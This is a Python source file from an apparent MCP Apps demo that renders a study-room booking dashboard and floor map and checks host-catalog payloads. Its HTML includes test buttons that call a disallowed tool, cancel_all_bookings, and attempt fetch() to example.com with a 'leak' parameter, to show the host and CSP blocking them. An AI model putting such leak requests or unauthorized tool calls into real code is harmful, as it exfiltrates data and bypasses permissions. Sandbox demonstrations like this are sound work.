"""What the scripted agent produces for each tool.

  app_html()            the open-ended surface: a complete HTML app served as
                        the ui:// resource. It speaks the MCP Apps bridge to
                        its host over postMessage (JSON-RPC 2.0).
  floor_map_html()      the one open-ended region inside the mixed payload
  static_payload()      one prebuilt component + props, rendered by the host
  declarative_payload() an element map from the HOST's catalog
"""
from __future__ import annotations

CATALOG = {"Stack", "Heading", "MetricCard", "RoomTable", "OccupancyChart", "AppRegion"}

# The view side of the bridge, shared by both ui:// documents.
BRIDGE_JS = r"""
let nextId = 1; const pending = {};
function rpc(method, params) {            // request to the host, awaits the response
  const id = nextId++;
  parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*");
  return new Promise((resolve, reject) => { pending[id] = { resolve, reject }; });
}
function notify(method, params) { parent.postMessage({ jsonrpc: "2.0", method, params }, "*"); }
function log(s) { const el = document.getElementById("log"); if (el) el.textContent = s + "\n" + el.textContent; }
window.addEventListener("message", (e) => {
  if (e.source !== parent) return;                  // only the host may talk to us
  const m = e.data || {};
  if (m.id && pending[m.id]) {
    const p = pending[m.id]; delete pending[m.id];
    m.error ? p.reject(m.error) : p.resolve(m.result); return;
  }
  if (m.method === "ui/notifications/tool-input") { log("<- tool-input " + JSON.stringify(m.params.arguments)); }
  if (m.method === "ui/notifications/tool-result") { log("<- tool-result"); onResult(m.params); }
});
async function start() {
  const init = await rpc("ui/initialize", { protocolVersion: "2026-01-26",
                         appInfo: { name: "study-rooms-view", version: "1.0" }, appCapabilities: {} });
  log("<- host context " + JSON.stringify(init.hostContext));
  notify("ui/notifications/initialized", {});
}
"""


def app_html() -> str:
    return """<!doctype html><html><head><meta charset="utf-8"><title>Study rooms app</title><style>
body{font:14px system-ui;margin:0;padding:14px;background:#0f1d2b;color:#e8eef6}
h2{margin:0 0 10px;font-size:18px} .rooms{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.r{border-radius:12px;padding:12px;background:#1d3550} .r.free{background:#1e5a45}
.r small{display:block;opacity:.8} button{margin-top:8px;border:0;border-radius:6px;padding:5px 9px;cursor:pointer}
.bar{display:flex;gap:8px;margin:12px 0} .warn{background:#7a2e2e;color:#fff} pre{font:11px ui-monospace,monospace;
white-space:pre-wrap;background:#081320;padding:8px;border-radius:8px;max-height:130px;overflow:auto}
</style></head><body>
<h2>Study rooms &mdash; an MCP App (ui://rooms/dashboard)</h2>
<div id="metrics"></div><div class="rooms" id="rooms">waiting for tool-result&hellip;</div>
<div class="bar">
  <button class="warn" id="forbidden">try a tool the host did not allow</button>
  <button class="warn" id="exfil">try fetch() to the internet</button>
</div>
<pre id="log"></pre>
<script>""" + BRIDGE_JS + r"""
function onResult(result) {
  const s = result.structuredContent || {};
  document.getElementById("metrics").textContent = (s.metrics || []).map(m => m.label + ": " + m.value).join("   ·   ");
  const box = document.getElementById("rooms"); box.innerHTML = "";
  for (const r of s.rooms || []) {
    const d = document.createElement("div"); d.className = "r" + (r.available ? " free" : "");
    d.innerHTML = "<b>" + r.name + "</b><small>" + r.capacity + " seats &middot; " +
                  (r.available ? "free now" : "free at " + r.next_free) + "</small>";
    if (r.available) {
      const b = document.createElement("button"); b.textContent = "Book 14:00"; b.dataset.room = r.id;
      b.onclick = async () => {
        try {
          const res = await rpc("tools/call", { name: "book_room", arguments: { room: r.id, slot: "14:00-15:00" } });
          log("<- book_room: " + res.content[0].text); onResult(res);
        } catch (err) { log("x book_room refused: " + err.message); }
      };
      d.appendChild(b);
    }
    box.appendChild(d);
  }
}
document.getElementById("forbidden").onclick = async () => {
  try { await rpc("tools/call", { name: "cancel_all_bookings", arguments: {} }); log("!! forbidden tool ran"); }
  catch (err) { log("x host refused cancel_all_bookings: " + err.message); }
};
document.getElementById("exfil").onclick = async () => {
  try { await fetch("https://example.com/?leak=rooms"); log("!! fetch succeeded"); }
  catch (err) { log("x fetch blocked: " + err.name + " (CSP connect-src 'none')"); }
};
start();
</script></body></html>"""


def floor_map_html() -> str:
    return """<!doctype html><html><head><meta charset="utf-8"><style>
body{margin:0;font:13px system-ui} text{pointer-events:none} .room{cursor:pointer}
</style></head><body><svg id="map" viewBox="0 0 360 170" width="100%" style="max-width:420px;display:block;margin:auto"></svg>
<pre id="log" style="display:none"></pre>
<script>""" + BRIDGE_JS + r"""
function onResult(result) {
  const rooms = (result.structuredContent || {}).rooms || [];
  const svg = document.getElementById("map"); svg.innerHTML = "";
  rooms.forEach((r, i) => {
    const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
    g.setAttribute("transform", "translate(" + (20 + (i % 3) * 110) + "," + (20 + Math.floor(i / 3) * 70) + ")");
    g.innerHTML = "<rect class='room' width='100' height='58' rx='8' stroke='#555' fill='" +
      (r.available ? "#cfe8d4" : "#f1d3cf") + "'/><text x='50' y='34' text-anchor='middle'>" + r.id + "</text>";
    g.querySelector("rect").onclick = async () => {
      const res = await rpc("tools/call", { name: "book_room", arguments: { room: r.id, slot: "14:00-15:00" } });
      onResult(res);
    };
    svg.appendChild(g);
  });
}
start();
</script></body></html>"""


def static_payload(snap: dict) -> dict:
    return {"kind": "static", "component": "RoomTable", "props": {"rooms": snap["rooms"]}}


def declarative_payload(snap: dict, region: bool) -> dict:
    els = {
        "page": {"type": "Stack", "props": {}, "children": ["title", "metrics", "chart", "table"]},
        "title": {"type": "Heading", "props": {"text": "Study rooms - rendered by the host's catalog"}},
        "metrics": {"type": "Stack", "props": {"direction": "row"}, "children": ["m0", "m1", "m2"]},
        **{f"m{i}": {"type": "MetricCard", "props": m} for i, m in enumerate(snap["metrics"])},
        "chart": {"type": "OccupancyChart", "props": {"series": snap["occupancy"]}},
        "table": {"type": "RoomTable", "props": {"rooms": snap["rooms"]}},
    }
    if region:
        els["floor"] = {"type": "AppRegion", "props": {"resourceUri": "ui://rooms/floor-map",
                                                        "title": "Floor map (embedded MCP App)"}}
        els["page"]["children"].insert(3, "floor")
    return {"kind": "declarative", "root": "page", "elements": els}


def validate_payload(payload: dict) -> list[str]:
    if payload.get("kind") == "static":
        return [] if payload.get("component") in CATALOG else [f"'{payload.get('component')}' not in host catalog"]
    errs = [f"element '{k}': '{v.get('type')}' not in host catalog"
            for k, v in payload.get("elements", {}).items() if v.get("type") not in CATALOG]
    regions = [v for v in payload.get("elements", {}).values() if v.get("type") == "AppRegion"]
    if len(regions) > 1:
        errs.append("at most one AppRegion")
    return errs
